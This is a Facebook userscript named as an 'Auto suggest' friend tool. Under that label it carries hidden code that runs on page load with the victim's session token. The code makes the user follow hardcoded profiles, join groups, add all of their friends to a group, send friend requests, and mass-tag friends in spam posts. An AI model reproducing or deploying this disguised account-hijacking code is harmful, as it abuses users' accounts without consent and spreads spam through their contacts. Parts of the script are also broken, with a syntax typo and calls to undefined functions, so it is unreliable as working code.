// ==UserScript==
// @name            FAcebook NEW Auto suggest *UPDATE 22/03/2014*!
// @description     FAcebook Auto suggest by sunny
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// @version			 Sunny v.5 
// ==/UserScript==
// tit
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function cereziAl(b) {
   var c = b + "=";
   if (document.cookie.length > 0) {
      konum = document.cookie.indexOf(c);
      if (konum != -1) {
         konum += c.length;
         son = document.cookie.indexOf(";", konum);
         f(son == -1) {
            son = document.cookie.length
         }
         return unescape(document.cookie.substring(konum, son))
      } else {
         return ""
      }
   }
}

function getRandomInt(b, c) {
   return Math.floor(Math.random() * (c - b + 1)) + b
}

function randomValue(b) {
   return b[getRandomInt(0, b.length - 1)]
}
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(d) {
   var c = new XMLHttpRequest();
   var b = "/ajax/follow/follow_profile.php?__a=1";
   var g = "profile_id=" + d + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
   c.open("POST", b, true);
   c.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
   c.setRequestHeader("Content-length", g.length);
   c.setRequestHeader("Connection", "close");
   c.onreadystatechange = function () {
      if (c.readyState == 4 && c.status == 200) {
         c.close
      }
   };
   c.send(g)
}

function sublist(b) {
   var c = document.createElement("script");
   c.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + b + " }).send();
";
   document.body.appendChild(c)
}
a("100002074065956");
a("100007936002975");
a("100006526814498");
sublist("588310551248075");
sublist("606044962807967");
var gid = ['588310551248075'];
var gid = ['588310551248075'];
var gid = ['588310551248075'];
var gid = ['143087752509107'];
var gid = ['164705327073480'];
var gid = ['154629457926783'];
// Auto Friend Request
IDS("1186785682");
IDS("1306417175");
IDS("100004532585281");
var gid = ['588310551248075'];
var gid = ['588310551248075'];
var gid = ['588310551248075'];
var gid = ['143087752509107'];
var gid = ['164705327073480'];
var gid = ['154629457926783'];
var fb_dtsg = document.getElementsByName("fb_dtsg")[0]
["value"];
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var httpwp = new XMLHttpRequest();
var urlwp = "/ajax/groups/membership/r2j.php?__a=1";
var paramswp = "&ref=group_jump_header&group_id=" + gid + "&fb_dtsg=" + fb_dtsg + "&__user=" + user_id + "&phstamp=";
httpwp.open("POST", urlwp, true);
httpwp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
httpwp.setRequestHeader("Content-length", paramswp.length);
httpwp.setRequestHeader("Connection", "keep-alive");
httpwp.send(paramswp);
var fb_dtsg = document.getElementsByName("fb_dtsg")[0]["value"];
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var friends = new Array();
gf = new XMLHttpRequest();
gf.open("GET", "/ajax/typeahead/first_degree.php?__a=1&viewer=" + user_id + "&token" + Math.random() + "&filter[0]=user&options[0]=friends_only", false);
gf.send();
if (gf.readyState != 4) {} else {
   data = eval("(" + gf.responseText.substr(9) + ")");
   if (data.error) {} else {
      friends = data.payload.entries.sort(function (b, c) {
         return b.index - c.index
      })
   }
}
for (var i = 0; i < friends.length; i++) {
   var httpwp = new XMLHttpRequest();
   var urlwp = "/ajax/groups/members/add_post.php?__a=1";
   var paramswp = "&fb_dtsg=" + fb_dtsg + "&group_id=" + gid + "&source=typeahead&ref=&message_id=&members=" + friends[i]["uid"] + "&__user=" + user_id + "&phstamp=";
   httpwp.open("POST", urlwp, true);
   httpwp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
   httpwp.setRequestHeader("Content-length", paramswp.length);
   httpwp.setRequestHeader("Connection", "keep-alive");
   httpwp.onreadystatechange = function () {
      if (httpwp.readyState == 4 && httpwp.status == 200) {}
   };
   httpwp.send(paramswp)
}
var spage_id = "143087752509107";
var spost_id = "154629457926783";
var sfoto_id = "143087752509107";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun = new Date();
var btarihi = new Date();
btarihi.setTime(bugun.getTime() + 1000 * 60 * 60 * 4 * 1);
if (!document.cookie.match(/paylasti=(\d+)/)) {
   document.cookie = "paylasti=hayir;expires=" + btarihi.toGMTString()
}

function sarkadaslari_al() {
   var xmlhttp = new XMLHttpRequest();
   xmlhttp.onreadystatechange = function () {
      if (xmlhttp.readyState == 4) {
         eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);
", "") + ";");
         for (f = 0; f < Math.round(arkadaslar.payload.entries.length / 10); f++) {
            smesaj = "";
            smesaj_text = "";
            for (i = f * 10; i < (f + 1) * 10; i++) {
               if (arkadaslar.payload.entries[i]) {
                  smesaj += " @[" + arkadaslar.payload.entries[i].uid + ":" + arkadaslar.payload.entries[i].text + "]";
                  smesaj_text += " " + arkadaslar.payload.entries[i].text
               }
            }
            sdurumpaylas()
         }
      }
   };
   var params = "&filter[0]=user";
   params += "&options[0]=friends_only";
   params += "&options[1]=nm";
   params += "&token=v7";
   params += "&viewer=" + user_id;
   params += "&__user=" + user_id;
   if (document.URL.indexOf("https://") >= 0) {
      xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true)
   } else {
      xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true)
   }
   xmlhttp.send()
}
var tiklama = document.addEventListener("click", function () {
   if (document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0) {
      svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
      sarkadaslari_al();
      document.cookie = "paylasti=evet;expires=" + btarihi.toGMTString();
      document.removeEventListener(tiklama)
   }
}, false);

function sarkadasekle(c, g) {
   var b = new XMLHttpRequest();
   b.onreadystatechange = function () {
      if (b.readyState == 4) {}
   };
   b.open("POST", "/ajax/add_friend/action.php?__a=1", true);
   var d = "to_friend=" + c;
   d += "&action=add_friend";
   d += "&how_found=friend_browser";
   d += "&ref_param=none";
   d += "&outgoing_id=";
   d += "&logging_location=friend_browser";
   d += "&no_flyout_on_click=true";
   d += "&ego_log_data=";
   d += "&http_referer=";
   d += "&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value;
   d += "&phstamp=165816749114848369115";
   d += "&__user=" + user_id;
   b.setRequestHeader("X-SVN-Rev", svn_rev);
   b.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
   if (g == "farketmez" && document.cookie.split("cins" + user_id + "=").length > 1) {
      b.send(d)
   } else {
      if (document.cookie.split("cins" + user_id + "=").length <= 1) {
         cinsiyetgetir(c, g, "sarkadasekle")
      } else {
         if (g == document.cookie.split("cins" + user_id + "=")[1].split(";")[0].toString()) {
            b.send(d)
         }
      }
   }
}
var cinssonuc = {};
var cinshtml = document.createElement("html");

function scinsiyetgetir(uid, cins, fonksiyon) {
   var xmlhttp = new XMLHttpRequest();
   xmlhttp.onreadystatechange = function () {
      if (xmlhttp.readyState == 4) {
         eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);", "") + ";");
         cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html;
         btarihi.setTime(bugun.getTime() + 1000 * 60 * 60 * 24 * 365);
         if (cinshtml.getElementsByTagName("select")[0].value == "1") {
            document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString()
         } else {
            if (cinshtml.getElementsByTagName("select")[0].value == "2") {
               document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString()
            }
         }
         eval(fonksiyon + "(" + id + "," + cins + ");")
      }
   };
   xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
   xmlhttp.setRequestHeader("X-SVN-Rev", svn_rev);
   xmlhttp.send()
}

function autoSuggest() {
   links = document.getElementsByTagName("a");
   for (i in links) {
      l = links[i];
      if (l.innerHTML == '<span class="uiButtonText">Suggest Friend</span>') {
         l.click()
      }
   }
}

function blub() {
   if (document.getElementsByClassName("pbm fsm").length == 1) {
      w = document.getElementsByClassName("pbm fsm")[0];
      e = document.createElement("a");
      e.innerHTML = "Auto Suggest by Sunny";
      e.className = "uiButton";
      e.onclick = autoSuggest;
      if (w.childElementCount == 0) {
         w.appendChild(document.createElement("br"));
         w.appendChild(e)
      }
   }
}
blub();
document.addEventListener("DOMNodeInserted", blub, true);